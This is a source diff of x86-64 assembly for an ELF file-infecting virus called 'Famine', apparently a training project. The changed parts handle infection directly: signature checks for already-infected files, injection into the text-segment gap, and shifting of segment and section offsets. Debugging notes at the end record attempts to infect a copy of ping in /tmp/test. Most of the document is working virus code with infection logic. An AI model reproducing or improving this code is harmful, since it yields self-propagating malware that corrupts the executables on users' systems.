@@ -119,7 +119,7 @@ _file:
 	cmp byte [rsi], 0
 	jne .dir
 	pop rsi														; Put the filename in rsi
-	.fname:														; Copy the filenameto 'famine' structure and the terminating NULL BYTE
+	.fname:														; Copy the filename to 'famine' structure and the terminating NULL BYTE
 	movsb
 	cmp byte [rsi - 1], 0
 	jne .fname
@@ -228,18 +228,29 @@ _file:
 	sub rdi, rsi
 	mov FAM(famine.gap_size), rdi
 
+	; === Checking for virtual address overlapping. If virtual addresses would overlap, abort ===
+	add rax, elf64_phdr.p_vaddr
+	mov rax, [rax]						; rax has p_vaddr of following segment
+	mov rdi, FAM(famine.txt_vaddr)		; rdi has p_vaddr of text segment
+	add rdi, FAM(famine.txt_filesz)
+	sub rax, rdi						; space available in memory after text segment in terms of vaddr
+	cmp rax, VIRUS_SIZE
+	jl _end_file_infection
+
 	; === Check if the file was already infected ===
 	mov rdi, FAM(famine.map_ptr)
 	add rdi, FAM(famine.txt_offset)
 	add rdi, FAM(famine.txt_filesz)								; If the file was already infected, we increased the text segment size by VIRUS_SIZE, so the signature is at txt_offset + txt_filesz
 	sub rdi, (_finish - signature)
-	mov rax, [rel signature]
-	cmp rax, qword [rdi]										; Comparing the word 'Famine' of the signature
+	mov rsi, [rel signature]
+	cmp rsi, qword [rdi]										; Comparing the word 'Famine' of the signature
 	je _end_file_infection										; If the file was already infected, we ignore it
 
+
+	; === Checking if we can inject in gap ===
 	mov rdi, VIRUS_SIZE
 	cmp qword FAM(famine.gap_size), rdi
-	jg _inject_in_gap											; If gap_size is greater than VIRUS_SIZE, we will inject in gap for maximum stealth
+	jg _inject_in_gap
 
 
 	; === Close the first mapping with munmap ===
@@ -284,15 +295,7 @@ _file:
 	.patch_segments:
 	add rax, elf64_phdr_size								; Go to next segment
 	mov rdi, rax
-	add rdi, elf64_phdr.p_offset							; p_offset += PAGE_SIZE			can be optimised by an add qword like sections
-	mov rsi, [rdi]
-	add rsi, PAGE_SIZE
-	mov [rdi], rsi
-	add rdi, elf64_phdr.p_vaddr - elf64_phdr.p_offset		; p_vaddr += PAGE_SIZE
-	mov rsi, [rdi]
-	add rsi, PAGE_SIZE
-	mov [rdi], rsi
-	add rdi, elf64_phdr.p_paddr - elf64_phdr.p_vaddr
+	add rdi, elf64_phdr.p_offset							; p_offset += PAGE_SIZE
 	add qword [rdi], PAGE_SIZE
 	
 	inc r13
@@ -320,14 +323,13 @@ _file:
 	cmp r13, rsi												; If the offset of the section is after the injection point...
 	jge .pass
 	add qword [rdi], PAGE_SIZE									; We add 4096 to their offset, since their content will be shifted
-	sub rdi, 0x8
-	add qword [rdi], PAGE_SIZE									; adding PAGE_SIZE to virtual addresses of sections too
 	.pass:
 	inc r10
 	cmp r10, r14
 	je .patch_elf_header
 	add rax, elf64_shdr_size
 	jmp .patch_sections
+
 
 	; === If section headers (e_shoff) are located after injection point, add 4096 to their offset since they will be shifted ===
 	.patch_elf_header:
@@ -449,4 +451,15 @@ _finish:
 ; x /120i 0x555555569bf1
 
 ; shortly after 0x555555569fc8, the virus isn't properly copied (more precisely, right after 0x555555569ff3)
-; 
+
+; ping
+; 0x555555560ffd
+
+
+; x /70a 0x555555554000 + 0x12a90
+; readelf -d /tmp/test/ping
+; Should I try and patch the DYNAMIC section in order to increase the virtual address of segments ?
+
+; break *(0x0000555555558828) --> just before crash
+; pass it with set ($rip+0xd7aa)=0x7ffff72c7b10
+; second one 0x0000555555560ad9
